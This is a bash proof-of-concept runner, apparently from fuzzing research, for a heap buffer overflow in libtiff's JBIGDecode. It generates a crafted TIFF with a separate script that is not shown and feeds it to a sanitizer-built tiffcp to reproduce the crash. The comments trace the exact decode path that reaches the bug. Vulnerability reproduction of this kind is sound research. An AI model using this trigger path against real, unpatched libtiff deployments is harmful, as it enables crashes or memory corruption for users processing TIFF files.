#!/usr/bin/env bash
# PoC runner for VULN-001: JBIGDecode heap buffer overflow in libtiff
#
# Trigger tool: tiffcp (NOT tiffsplit)
#
# tiffsplit does NOT trigger the vulnerability: its cpStrips() function
# calls TIFFReadRawStrip() (line 251 of tools/tiffsplit.c), which bypasses
# the codec layer entirely and never calls JBIGDecode.
#
# The correct trigger is tiffcp with '-c none' (transcode to uncompressed):
#   cpDecodedStrips() -> TIFFReadEncodedStrip() -> TIFFFillStrip() -> JBIGDecode()
#
# Steps:
#   1. Generate the crafted TIFF file (poc.tif)
#   2. Pass it to tiffcp (ASAN+UBSAN build) and capture the crash output

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TIFFCP="/data/ylwang/non-textfuzz/target/libtiff/build_test/bin/tiffcp"
POC_TIFF="${SCRIPT_DIR}/poc.tif"
OUT_TIFF="/tmp/jbig_poc_out.tif"

# ---------------------------------------------------------------------------
# 1. Generate the PoC TIFF
# ---------------------------------------------------------------------------
echo "[*] Generating poc.tif ..."
python3 "${SCRIPT_DIR}/vuln_001_gen.py"
echo

# ---------------------------------------------------------------------------
# 2. Verify the binary and file exist
# ---------------------------------------------------------------------------
if [[ ! -x "${TIFFCP}" ]]; then
    echo "[-] tiffcp not found or not executable: ${TIFFCP}"
    exit 1
fi
if [[ ! -f "${POC_TIFF}" ]]; then
    echo "[-] poc.tif not found: ${POC_TIFF}"
    exit 1
fi

echo "[*] Running tiffcp against poc.tif ..."
echo "    Binary : ${TIFFCP}"
echo "    Input  : ${POC_TIFF}"
echo "    Output : ${OUT_TIFF}"
echo "    Flag   : -c none (transcode to uncompressed -> triggers JBIGDecode)"
echo

# ASAN reports go to stderr; capture both streams.
# tiffcp exits non-zero on ASAN crash, so disable errexit briefly.
ASAN_OPTIONS="halt_on_error=1:detect_leaks=0" \
set +e
ASAN_OPTIONS="halt_on_error=1:detect_leaks=0" \
"${TIFFCP}" -c none "${POC_TIFF}" "${OUT_TIFF}" 2>&1
EXIT_CODE=$?
set -e

echo
if [[ ${EXIT_CODE} -ne 0 ]]; then
    echo "[!] tiffcp exited with code ${EXIT_CODE}"
    echo "[!] Expected: ASAN heap-buffer-overflow in JBIGDecode / _TIFFmemcpy"
else
    echo "[?] tiffcp exited cleanly (ASAN may not be active, or overflow was silent)"
fi
